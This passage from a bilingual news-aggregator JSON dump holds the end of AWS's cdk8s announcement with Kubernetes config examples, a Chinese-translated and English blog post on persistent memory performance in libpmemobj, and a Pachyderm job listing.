allow users to describe their route mappings and configuration through a friendly, strongly-typed syntax.\n      This is day one for cdk8s. We are exploring the implications of designing a rich high-level construct library that will cover the core Kubernetes APIs. The idea is to expose the full feature set of Kubernetes through an awesome class library.\n  For a taste of what that might look like, consider the common pattern in Kubernetes where you can use a ConfigMap to store the contents of some configuration and make it available to a pod via a volume.\n    Define the pod through this YAML:  apiVersion: v1\rkind: Pod\rmetadata:\r name: dapi-test-pod\rspec:\r containers:\r - name: test-container\r image: k8s.gcr.io/busybox\r command: [ &#34;/bin/sh&#34;, &#34;-c&#34;, &#34;ls /etc/config/&#34; ]\r volumeMounts:\r - name: config-volume\r mountPath: /etc/config\r volumes:\r - name: config-volume\r configMap:\r name: my-config\r restartPolicy: Never\n    // define a config map with all the files in a local dir\rconst config = ConfigMap.fromDirectory(this, &#39;./config&#39;);\r\r// define a pod\rconst pod = new Pod(this, &#39;dapi-test-pod&#39;);\r\r// add the config map as a volume\rconst volume = pod.addConfigMapVolume(config);\r\r// add a container to the pod and mount the files\r// to /etc/config, and print them on initialization\rconst container = pod.addContainer(&#39;test-container&#39;);\rcontainer.image = &#39;k8s.gcr.io/busybox&#39;;\rcontainer.mount(volume, &#39;/etc/config&#39;); // &lt;-- NICE!\rcontainer.command = [ &#34;/bin/sh&#34;, &#34;-c&#34;, &#34;ls /etc/config/&#34; ];\rcontainer.restartPolicy = PodRestartPolicy.NEVER;\n  I hope this gives you a sense of the potential of such high-level API. You can find more details about the high-level design project in our  research section on GitHub.\n    Today we are announcing that cdk8s is in “ alpha” stage. This means that we think it is ready for folks to start to play with in their environments, and collaborate with us to make this project work for their use cases.\n  It also means that we expect cdk8s to continue to change significantly in the coming months, until we feel it is stable. We will publish a changelog with each release with information about breaking changes and new features.\n  cdk8s is an open-source project, built for the entire Kubernetes community. It is fully developed on  https://github.com/awslabs/cdk8s and we encourage and celebrate all collaboration and contribution.\n  We’d love to hear what you have to say and welcome contributions on the APIs, developer experience, integration with other tools, documentation, or features.\n  Here are a few directions we’ve been exploring, along with their GitHub issue links, so you can +1 and participate in the discussion:\n  Add support for new languages:  Java,  .NET and  Go are on our radar. Let us know what  other languages you’d like to see.\n      Publish constructs as custom resources backed by a generic “CDK synthesizer operator”.\n  We are incredibly excited about this project and truly believe it can make life incredibly productive and fun for developers using Kubernetes.\n    To get started, go to  cdk8s.io. The best way to get a feel for cdk8s is to pick it up for a little spin through one of the Getting Started guides, either in  TypeScript or in  Python. These snappy little tutorials will walk you through the first steps of installing cdk8s, using the k8s APIs and even authoring your own custom constructs.", "posttime": "2020-05-15 00:04:05", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "内斯,cdk,kubernetes", "title": "库伯内斯的CDK", "title_en": "CDK for Kubernetes", "transed": 1, "url": "https://aws.amazon.com/blogs/containers/introducing-cdk-for-kubernetes/", "via": "", "real_tags": ["内斯", "cdk"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1002104, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "教书育人对我来说一直是一项挑战。我倾向于跳过我错误地认为显而易见的事情，或者在解释问题的解决方案时在推理上有很大的飞跃。因此，当我试图解释一个完整的视角时，我倾向于漫无边际地闲聊，希望观众知道如果我讲得太快，什么时候应该打断我。然而，这并不适用于博客帖子，比如我目前正在写的那篇。这就是为什么我有一个要求，读者，请一定要告诉我，如果我在这个问题上走得太快了-谢谢！\n那么，我为什么要写这篇看似跑题的序言呢？我一直在试着写一篇关于持久性内存编程的性能以及为什么它很困难的文章。我的第一个想法是，它真的不是这样的，你应该遵循你对正常程序所遵循的相同的老常识规则。毕竟它只是内存，但具有更高的访问延迟。但是，当我回顾libpmemobj(我们的内存分配器和事务系统)的发展历史，以及自第一个版本以来我们所做的性能改进时，我突然不那么确定了。\n毕竟，如果为持久化内存编写高性能代码很容易，我们至少在第一次就会得到一些正确的结果。不是我们当时想的那么熟练，就是我们当时没有那么熟练。这对我来说肯定不是超出了可能的范围，但我的团队其他人呢？他们绝对是有素质的人。所以…。为了挽回面子，我们会假设我的第一直觉是错误的，毕竟制作性能持久记忆代码是很难的。\n以下是我试图解释为什么会出现这种情况，以及我们是如何在开发libpmemobj的过程中艰难地获得这一点的。\n但是，在我们深入了解有关性能的具体细节之前，我们首先需要定义什么是持久性内存。我希望做…很容易。\n根据你问的是谁，你可能会得到不同的答案。我们通常使用的宽泛定义是，它是非易失性的内存，并且具有足够低的访问延迟，因此在等待读取或写入完成时停止CPU是合理的。\n但是这个定义太宽泛了，如果我们只在它的限制范围内操作，那么关于性能的讨论就会相当肤浅，并且仅限于持久存储器的非易失性方面。回想起来，这是我们在最初设计PMDK的算法和数据结构时所犯的错误之一。稍后再讲。\n一个更狭隘的答案是，永久存储器可以定义为一种新的存储器类别，最好的特征是Y公司的产品X。例如，如果您要问我，一个付费英特尔先令，这种永久存储器是什么，我的答案是：我可以让您对英特尔®的新革命性产品英特尔®Optane™DC Persistent Memory感兴趣吗？当然，我是开玩笑的，但我的观点是，专注于一类产品，如此类产品中最突出的例子所表征的那样，使我们能够拥有多种\n这就是我们最终得出这篇帖子标题中的数字的原因。英特尔新的永久存储设备的一个更重要的特点是它的平均访问延迟。300纳秒。\n但在我们把它放在上下文中之前，这个数字本身并没有多大意义。\n那么，300纳秒的延迟快吗？对于存储来说，它绝对是如此，从字面上讲，它比任何其他技术都要快几个数量级。但是为了记忆呢？不完全是。它的速度绝对足够快，可以被认为是内存，但就数据结构设计而言，它也不够快，不能像普通的DRAM那样对待。特别是当我们考虑持久存储器编程模型的更广泛的方面时。\n持久记忆就像光一样，“我们有两幅相互矛盾的现实图景”，它不能简单地用记忆或存储来描述，因为这两个术语都不能完全解释这个新的层次。\n就像存储一样，它可以通过正常的文件I/O操作(如read()或write())进行访问，并且就像内存一样，可以通过内存映射I/O在字节级别直接访问它，而不需要介入页面缓存层。\n而且，就像使用存储一样，应用程序需要以某种方式将其写入PMEM的内容与介质同步，就像您发出fsync()或msync()来确保I/O一直到达存储设备一样。事实上，这两个调用也确实可以实现持久内存-但还有更好的方法。\n让我们先倒回一点。我之前告诉过您，永久内存是非易失性的，您可以直接写入。那么，我们究竟为什么需要费心同步I/O呢？嗯，出于同样的原因，我们对常规存储设备也是这样做的。从应用程序到DIMM的整个存储过程中都有各种缓存和缓冲区。最重要的是，这里有CPU缓存。\n当一个商店到达平台的持久域时，我们认为它是持久的。驻留在持久域中的组件中的所有存储都能确保到达DIMM，即使在出现故障的情况下也是如此，除非出现一些灾难性的硬件问题。\n简而言之，在通常情况下，这意味着应用程序需要将存储从CPU缓存中清除出来，然后才能将其视为持久化。您可以使用mSync()来做这件事，内核会做正确的事情，但是您也可以使用用户空间指令直接刷新CPU缓存，这有两个原因：a)不需要昂贵的syscall；b)可以使用缓存行粒度(而不是页面粒度)刷新数据。\n哦，在x86-64上，缓存线是64字节，这意味着小于64字节的存储在写入DIMM时会引起一些写入放大。\n总而言之，持久性内存确实是非易失性的，但是需要将存储从CPU缓存中清除出来，理想情况下是在单个缓存线上使用用户空间指令。\n但是…。(似乎总是有一个BUT)缓存刷新指令将行从缓存中逐出。这意味着在写入后立即读取某些内容会导致缓存未命中-需要CPU从DIMM获取数据。而且，这还不是全部。即使在刷新后在同一高速缓存线中再次写入某些内容，通常也会导致缓存未命中，从而使存储成本翻倍。\n除非您想创建一些真正持久的数据结构，否则所有这些都无关紧要。我所说的持久性指的是寿命比创建它的进程的寿命更长的数据结构。但是，该定义也将包括在进程退出时序列化的数据结构，这一众所周知的方法不在本文的…讨论范围之内。因此，让我们将焦点缩小到比进程寿命更长且即使出现故障也始终保持一致的数据结构。我们通常说这样的数据结构是失效原子的。\n这听起来与并发(原子)数据结构惊人地相似，不是吗？只需将“进程”替换为“线程”，将“失败”替换为“抢占”。这一观察结果是学术界和产业界围绕持久记忆的许多想法的基础。为了提出高效的算法，我们，PMDK团队，一直在大量利用为并发编程所做的大量工作。\nfoo-&gt；bar=10；.FETCH_AND_ADD(&amp；foo-&gt；bar，5)；/*Visible=15，Persistent on DIMM=？(10或15)*/Persistent(&amp；Foo-&gt；bar)；/*Visible=15，Persistent on DIMM=15*/。\n直接使用并发数据结构来实现故障原子性的一个问题是可见性和持久性之间的区别，并发数据结构必须保证所有执行线程始终保持一致的状态。但是，持久化进程还必须确保在允许其他进程或线程基于结构的状态做出任何决策之前，数据存在于持久域中。正确地执行此操作对于性能至关重要。\n每次将元素插入到链表中时，都需要：\n要以并发的方式做到这一点，我们可以简单地用某种类型的锁来包围这些操作，以防止其他线程在插入过程中访问列表。对于喜欢冒险的人来说，编写一个无锁算法也是一种选择，因为它可能会有更好的伸缩性。\n然而，让它成为原子故障需要我们回答几个基本问题。分配内存意味着什么呢？堆本身需要持久化。当程序中断时，我们必须确保分配的对象不会泄漏。堆毕竟是持久的。接下来，我们将如何以故障保护原子的方式对多个互不相交的内存位置进行更改？这不是在我们修改数据结构时阻止其他进程查看它那么简单。我们的应用程序的执行环境随时可能被残忍地杀死，迫使附加到同一持久内存区域的下一个进程以某种方式处理中断的操作。最后，我们必须问问自己，这是否真的是我们想要做的？创建持久的双向链表是目标吗？根据我的经验，创建数据结构或算法只是达到目的的一种手段。一旦我们稍微改变了我们对记忆的假设，重新考虑我们最初只使用我们所知道的东西的本能可能会更有意义。\n回想起来，对于libpmemobj，我们错误地回答了前两个问题，甚至没有问到第三个问题。\n有了这个，我将让您思考，直到假期结束：)。\n在这篇文章中，我们了解了什么是持久内存以及如何使用它，我们还讨论了持久数据结构意味着什么，以及这可能如何影响性能。\n在下一部分，我们将更深入地研究我对我提出的三个问题的回答，以及我们是如何基于重新考虑了关于持久记忆的最初假设后进行的自我反思来改进我们的库的。", "note_en": "Educating people has always been a challenge for me. I tend to skip over thingsI wrongly consider obvious, or do large leaps in reasoning when explaining asolution to a problem. And so, when faced with an attempt to explain a complextopic, I tend to ramble on and on, hoping that the audience knows when to interruptme if I go too fast. However, this doesn’t hold true for blog posts, such as the one I’mcurrently writing. This is why I have a request to you, the reader,please do let me know if I went too fast on this one - thanks!\n So, why did I write this seemingly off-topic preamble? I’ve been trying to createa write up about performance in persistent memory programming and why it’s difficult.And my immediate thought was that it really is not and you should just followthe same old common sense rules you would for normal programs. It is just memoryafter all, but with higher access latency. But then, when I look back at thedevelopment history of libpmemobj, our memory allocator and transaction system,and the performance improvements we’ve made since the first version, I’msuddenly not so sure.\n  After all, if writing high-performance code for persistent memory were easy,we’d get it at least somewhat right the first time around. It’s either thator we were not as skilled as we thought we were back then. That’s certainlynot beyond the realms of possibility for me, but the rest of my team? They aredefinitely quality folks. So… at an attempt to save face, we will operate onthe assumption that my first instinct was wrong, and that crafting performantpersistent memory code is hard after all.\n What follows is my attempt at explaining why that is the case and how we’velearned that the hard way during development of libpmemobj.\n  But before we dive into the nitty-gritty details around performance, we firstneed to define what persistent memory is. I wish it were easy to do…\n Depending on who you ask, you might get a different answer. The broadestdefinition that we commonly use is that it’s memory that is non-volatile and hasaccess latency low enough that it is reasonable to stall the CPU while waitingfor reads or writes to complete.\n But that definition is so broad that, if we were to operate only within itsconstraints, it would make discussions around performance rather shallow andlimited to the non-volatile aspect of persistent memory.In retrospect, this is one of the mistakes we’ve made when first designing thealgorithms and data structures for PMDK. More on that later.\n A more narrow answer is that persistent memory can be defined as a new class ofmemories, best characterized by a product X from company Y.For example, if you were to ask me, a paid Intel shill, what is thispersistent memory thing, my answer would have to be: May I interest you inIntel®’s new revolutionary product, Intel® Optane™ DC Persistent Memory?I jest, of course, but it is my opinion that focusing on one category ofproducts, as characterized by the most prominent example from such category,enables us to have a multidimensional discussion that captures more aspectsof a given problem.\n And this is how we finally get to the number in the title of this post. One ofthe more important characteristics of Intel’s new Persistent Memory devices isits average access latency. 300 nanoseconds.\n  But that number alone doesn’t mean much until we put it in context.\n  So, is 300 nanoseconds latency fast? For storage it definitely is, literallyorders of magnitude faster than any other technology. But for memory? Not really.It’s definitely fast enough to be considered memory, but it’s also not fastenough to be treated just like normal DRAM as far as data structure design isconcerned. Especially when we consider the broader aspects of the Persistent Memory Programming Model.\n  With persistent memory, just like with light, “we have two contradictory pictures of reality”.It cannot be simply described as memory or storage, because neither of thoseterms fully explains this new tier.\n Just like with storage, it can be accessed through normal  File I/O operationssuch as  read() or  write(), and just like with memory, it can be accessed directlyat the byte level through  Memory Mapped I/O, without an intervening page-cache layer.\n And, just like with storage, the application needs to somehow synchronizewhat it wrote to PMEM with the media, just like you’d issue  fsync() or msync() to make sure that your I/O made it all the way to storage device.In fact, those two calls do exactly that also for persistent memory - but there’sa better way.\n  Let’s rewind a little first. I previously told you that persistent memory isnon-volatile and you can write to it directly. So why exactly do we need tobother with synchronizing the I/O? Well, for the same reason we do it for regularstorage devices. There are various caches and buffers along the way of a storefrom the application to the DIMM. Most importantly, there’s the CPU cache.\n We consider a store to be persistent when it reaches the persistent domain ofthe platform. All stores that reside in the components that are within thepersistent domain are ensured to reach the DIMM, even in case of failures,barring some catastrophic hardware problems.\n To cut a long story short, in the common case this means that applications need topush stores out of the CPU cache before it can be considered persistent.You can do that with an  msync() and the kernel will do the right thing,but you also directly flush the CPU cache using user-space instructions, whichis beneficial for two reasons: a) there’s no expensive syscall, and b) datacan be flushed with cacheline granularity, not a page granularity.\n Oh, and cachelines are 64 bytes on x86-64, meaning that stores smaller than thatincur some write amplification when writing to the DIMM.\n To sum up, persistent memory really is non-volatile, but stores need to beflushed out of the CPU cache, ideally using user-space instructions on individualcachelines.\n But… (it seems like there’s always a but) cache flushing instructions evictthe lines from the cache. Which means that reading something immediately afterwriting it causes a cache miss - requiring the CPU to fetch that data from the DIMM.And that’s not all. Even writing something again within the same cachelineafter a flush will usually cause a cache miss, doubling the cost of a store.\n  All of that really doesn’t matter until you want to create some data structurethat is actually persistent. And by persistent I mean a data structure whoselifetime is longer than that of the process which created it.However, that definition would also include data structures that are serializedwhen the process quits, a well-known approach which is out of scope ofthis post… because it’s boring.So, let’s narrow down our focus to data structures that outlive processes andare always consistent even in presence of failures. We usually say that suchdata structures are failure atomic.\n That sounds eerily similar to concurrent (atomic) data structures, doesn’t it?Just replace “process” with “thread” and “failure” with “preemption”.This observation lies at the foundation of many ideas around persistent memoryin academia and industry alike. To come up with efficient algorithms, we,the PMDK team, have been heavily taking advantage of the vast amount of workthat’s been done for concurrent programming.\n foo-&gt;bar = 10;\t...\tfetch_and_add(&amp;foo-&gt;bar, 5);\t/* visible = 15, persistent on DIMM = ? (10 or 15) */\tpersist(&amp;foo-&gt;bar);\t/* visible = 15, persistent on DIMM = 15 */\n One problem with straight out using concurrent data structures for failureatomicity is the difference between visibility and persistence.Concurrent data structure have to guarantee that all threads of execution alwayssee a consistent state. Persistent ones however also have to ensure that data ispresent in the persistent domain before other processes or threads are allowed tomake any decisions based on the structure’s state. Doing this the right way iscritical for performance.\n    Each time an element is inserted into a linked list, there’s a need to:\n  To do this in a concurrent way we could simply surround these operationswith some kind of a lock that would prevent other threads from accessing the listwhile there’s an ongoing insert. For the adventurous, writing a lock-free algorithm,that could maybe scale better, is also an option.\n  Making it failure atomic however, requires us to answer a couple of fundamentalquestions. What does it even mean to allocate memory? The heap itself needs tobe persistent. And we have to make sure that the allocated object isn’t leakedwhen something interrupts the program. The heap is persistent after all.Next, how will we make changes to multiple disjoint memory locations in a waythat is fail-safe atomic? It’s not as simple as just preventing other processesfrom viewing our data structure while we modify it. The executionenvironment of our application can be brutally killed at any moment, forcing thenext process that attaches to the same persistent memory region to somehow dealwith the interrupted operation.And finally, we have to ask ourselves if this is really what we want to do? Ismaking a persistent doubly-linked list the goal? From my experience,creating a data structure or an algorithm is just a means to an end. Once wechange our assumptions about memory a little bit, it might make more senseto reconsider our initial instinct of just using what we know.\n With libpmemobj, in retrospect, we’ve incorrectly answered the first twoof those questions, and failed to even ask the third.\n And with this, I’ll leave you thinking until the holiday season is over :)\n  In this post, we’ve learned about what persistent memory is and how it can be used.We’ve also discussed what it means for a data structure to be persistent, and howthat might affect performance.\n In the next part, we are going to be diving deeper into my answers to thethree questions I’ve posed, and how we’ve improved our libraries based onself reflections that we’ve had after we reconsidered our initial assumptionsabout persistent memory.", "posttime": "2020-05-14 23:48:40", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "性能,存储器,persistent,内存", "title": "持久存储器性能：300纳秒", "title_en": "Performance of Persistent Memory: 300 nanoseconds", "transed": 1, "url": "https://pmem.io/2019/12/19/performance.html", "via": "", "real_tags": ["性能", "存储器", "内存"]}, {"category": "", "categoryclass": "", "imagename": "dae8810ade3c3946bbe9fc35955157c1.png", "infoid": 1002103, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "首席数据科学布道员(美国远程可选)。\n布道主义和开发者倡导者", "note_en": "Lead Data Science Evangelist (US Remote Optional)\n Evangelism and Developer Advocacy", "posttime": "2020-05-14 23:48:21", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "hiring,数据", "title": "Pachyderm正在招聘高级DevOps和分布式系统工程师", "title_en": "Pachyderm Is Hiring Senior DevOps and Distributed Systems Engineers", "transed": 1, "url": "https://jobs.lever.co/pachyderm/", "via": "", "real_tags": ["hiring", "数据"]}]